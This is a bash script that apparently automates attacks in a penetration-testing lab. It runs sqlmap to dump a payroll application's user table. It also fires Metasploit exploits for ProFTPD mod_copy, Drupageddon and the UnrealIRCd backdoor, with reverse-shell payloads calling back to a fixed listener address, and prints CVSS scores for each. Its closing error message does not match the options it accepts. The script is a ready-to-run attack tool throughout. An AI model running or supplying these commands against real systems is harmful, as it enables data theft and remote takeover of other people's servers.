#!/bin/bash

ATTACK=$1
TARGET=$2


if [ $ATTACK == "1" ]
then 
	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dump 
	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/
elif [ $ATTACK == "CVE-2015-3306" ]
then
	msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set rhost $TARGET; set sitepath /var/www/html; set exploit cmd/unix/reverse_perl; run; sessions -i 1 -c ./command_shell.sh; exit -y; " 
	# in command shell run command background and then enter y
	SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
	rm results.txt
	./attack-script.sh $TARGET mysql $SERVER 
	echo "baseScore_V2: 10"
	echo "severity_V2: HIGH"
	echo "exploitabilityScore_V2: 10"
elif [ $ATTACK == "CVE-2014-3704" ]
then 
	msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set rhost $TARGET; set targeturi /drupal/; set payload php/reverse_perl; set lhost 192.168.0.79; exploit; "
	echo "baseScore_V2: 7.5"
	echo "severity_V2: HIGH"
	echo "exploitabilityScore_V2: 10"
elif [ $ATTACK == "CVE-2010-2075" ]
then 
	msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set rhost $TARGET; set rport 6697; set lhost 192.168.0.79; set payload cmd/unix/reverse_ruby; run; exit;"
	echo "baseScore_V2: 7.5"
	echo "severity_V2: HIGH"
	echo "exploitabilityScore_V2: 10"
else
	echo "Not valid. Enter either 1 or 2"
fi
